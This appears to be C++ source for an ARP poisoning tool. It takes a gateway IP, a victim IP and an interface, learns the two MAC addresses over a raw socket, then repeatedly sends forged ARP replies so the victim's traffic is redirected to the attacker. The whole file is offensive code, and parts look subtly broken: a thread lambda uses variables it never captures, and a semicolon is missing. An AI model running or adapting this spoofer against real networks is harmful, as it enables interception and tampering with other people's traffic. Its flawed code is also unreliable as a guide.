#include <iostream>
#include <cstdlib>
#include <cstdio>
#include <cstring>

#include <sys/socket.h>
#include <sys/ioctl.h>
#include <arpa/inet.h>
#include <netinet/if_ether.h>
#include <netinet/ip.h>
#include <net/if.h>
#include <net/if_arp.h>
#include <net/ethernet.h>
#include <linux/if_packet.h>
#include <unistd.h>
#include <thread>

#include "ip_address.h"
#include "mac_address.h"
#include "arp_packet.h"
#include "ethernet_frame.h"
#include "debug.h"
#include "io.h"

#define SPOOFED_SEND_DELAY 2

#define GUARD(x, err) if(!(x)) {    \
    printf("[x] ERROR: " err "\n"); \
    exit(EXIT_FAILURE);             \
}                                   \

MACAddress get_hardware_address(int fd, const char* if_name){
    struct ifreq ifr;
    memset(&ifr, 0, sizeof(ifr));
    ifr.ifr_addr.sa_family = AF_INET;
    strncpy(ifr.ifr_name, if_name, IFNAMSIZ-1);

    GUARD(ioctl(fd, SIOCGIFHWADDR, &ifr) >= 0, "failed to get mac address");
    
    unsigned char *mac = (unsigned char *)ifr.ifr_hwaddr.sa_data;
    MACAddress address;

    for(int i = 0; i < MAC_ADDRESS_LEN; ++i){
        address.octets[i] = mac[i];
    }

    return address;    
}

void broadcast_packet(
    int fd, struct sockaddr_ll* device, 
    const MACAddress& src_mac_addr, const IPv4Address& spoofed_ip_addr, const IPv4Address& dst_ip_addr
){
    static MACAddress broadcast_mac_addr = MACAddress::get_broadcast_addr();
    ARPPacket arp = ARPPacket(ARP_REQUEST, src_mac_addr, spoofed_ip_addr, broadcast_mac_addr, dst_ip_addr);
    EthernetFrame eth = EthernetFrame(broadcast_mac_addr, src_mac_addr, ETHTYPE_ARP);
    
    static uint8_t buffer[1500];
    
    write(buffer, eth, arp);

    printf("Frame: ");
    debug_buffer(buffer);

    int bytes_send = sendto(fd, buffer, ETH_HEADER_LEN + ARP_PACKET_LEN, 0, (const struct sockaddr*)device, sizeof(*device));
    printf("%d\n", bytes_send);
    GUARD(bytes_send > 0, "failed to broadcast packet");
}

MACAddress get_victim_response(int fd, const IPv4Address& victim_ip_addr){
    static uint8_t buffer[1500];

    while(true) {
        int bytes_read = recvfrom(fd, buffer, 1500, 0, NULL, NULL);
        GUARD(bytes_read > 0, "failed to read from socket");
        
        printf("Frame: ");
        debug_buffer(buffer);

        EthernetFrame   eth;
        ARPPacket       arp;
        read(buffer, eth, arp);

        // printf("From MAC: ");
        // print(arp.src_mac_addr);
        // printf("To MAC: ");
        // print(arp.target_mac_addr);
        // printf("From MAC: ");
        // print(eth.src_mac_addr);
        // printf("To MAC: ");
        // print(eth.dst_mac_addr);
        // printf("From IP: ");
        // print(arp.src_ip_addr);
        // printf("To IP: ");
        // print(arp.target_ip_addr);
        // printf("opcode: %d\n\n", arp.opcode);

        if(arp.opcode == ARP_REPLY && arp.src_ip_addr == victim_ip_addr){
            return arp.src_mac_addr;
        }
    }
}

void send_to_victim(
    int fd, struct sockaddr_ll* device, int repeat_delay,
    MACAddress src_mac_addr, IPv4Address spoofed_ip_addr, 
    MACAddress victim_mac_addr, IPv4Address victim_ip_addr
){
    ARPPacket arp = ARPPacket(ARP_REPLY, src_mac_addr, spoofed_ip_addr, victim_mac_addr, victim_ip_addr);
    EthernetFrame eth = EthernetFrame(victim_mac_addr, src_mac_addr, ETHTYPE_ARP);

    static uint8_t buffer[1500];  
    write(buffer, eth, arp);

    while(true){
        int bytes_send = sendto(fd, buffer, ETH_HEADER_LEN + ARP_PACKET_LEN, 0, (const struct sockaddr*)device, sizeof(*device));
        GUARD(bytes_send > 0, "failed to send data on socket");
        printf("[+] Spoofed ARP Packet sent\n");
        sleep(repeat_delay);
    }



}

int get_ifr_ifindex(int fd, struct ifreq *ifr) {
    GUARD(ioctl(fd, SIOCGIFINDEX, ifr) != -1, "failed to get if index");
    return ifr->ifr_ifindex;
}

void set_ifr_name(struct ifreq *ifr, const char *if_name){
    size_t if_name_len = strlen(if_name);
    if (if_name_len < sizeof(ifr->ifr_name)) {
        memcpy(ifr->ifr_name, if_name, if_name_len);
        ifr->ifr_name[if_name_len] = 0;
    } else {
        printf("[-] Error: Interface name is too long");
    }
}


void get_index_from_interface(int fd, struct sockaddr_ll* device, const char* if_name){
    struct ifreq ifr;
    set_ifr_name(&ifr, if_name);

    device->sll_family         = AF_PACKET;
    device->sll_ifindex        = get_ifr_ifindex(fd, &ifr);
    device->sll_halen          = ETHER_ADDR_LEN;
    device->sll_protocol       = htons(ETH_P_ARP);
    // memcpy(device.sll_addr, victim_mac, ETHER_ADDR_LEN);
    
    if(device->sll_ifindex){
        printf("[+] Got index: %d\n", device->sll_ifindex);
    }
    else{
        printf("[-] Error: Couldn't get index from ifname\n");
    }
}

int main(int argc, char** argv){
    if(argc < 4){
        // TODO: Show usage info
        printf("Expected 3 arguments got %d", argc);
        return 0;
    }

    auto gateway_ip = IPv4Address::from_str(argv[1]);
    auto victim_ip = IPv4Address::from_str(argv[2]);
    auto interface = argv[3];
    printf("Interface: %s\n", interface);

    int fd = socket(AF_PACKET, SOCK_RAW, htons(ETH_P_ARP));
    GUARD(fd != -1, "failed to create socket");

    MACAddress src_mac_addr = get_hardware_address(fd, interface);
    printf("Source MAC Address: ");
    print(src_mac_addr);

    struct sockaddr_ll device = {0};
    get_index_from_interface(fd, &device, interface);

    printf("Starting ARP Poisoning\n");

    broadcast_packet(fd, &device, src_mac_addr, gateway_ip, victim_ip);
    MACAddress victim_mac_addr = get_victim_response(fd, victim_ip);
    printf("Victim MAC Address: ");
    print(victim_mac_addr);
    
    std::thread victim_thread{
        [](){
            send_to_victim(fd, &device, SPOOFED_SEND_DELAY, src_mac_addr, gateway_ip, victim_mac_addr, victim_ip);
        }
    }
    
    broadcast_packet(fd, &device, src_mac_addr, victim_ip, gateway_ip);
    MACAddress gateway_mac_addr = get_victim_response(fd, gateway_ip);
    printf("Gateway MAC Address: ");
    print(gateway_mac_addr);
    send_to_victim(fd, &device, SPOOFED_SEND_DELAY, src_mac_addr, gateway_ip, victim_mac_addr, victim_ip);
    
    // close(fd);
    return 0;
}